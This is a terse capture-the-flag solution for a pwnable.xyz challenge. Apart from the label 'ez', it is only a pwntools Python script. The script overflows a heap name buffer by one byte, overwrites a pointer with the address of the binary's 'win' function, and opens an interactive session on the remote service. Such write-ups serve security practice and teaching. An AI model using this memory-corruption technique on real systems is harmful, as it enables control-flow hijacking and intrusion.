ez



脚本：

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
win_addr = e.symbols['win']

p = remote('svc.pwnable.xyz', 30023)
# p = process('./challenge')


p.sendafter(b'> ', b'1')
p.sendafter(b'name: ', b'a' * 0x20)

p.sendafter(b'> ', b'2')
p.sendafter(b'index: ', b'0')
p.sendafter(b'name: ', b'a' * 0x20 + p8(0x30))


p.sendafter(b'> ', b'2')
p.sendafter(b'index: ', b'0')
p.sendafter(b'name: ', b'a' * 0x28 + p64(win_addr))


p.sendafter(b'> ', b'3')
p.sendafter(b'index: ', b'0')
# gdb.attach(p)


p.interactive()

```

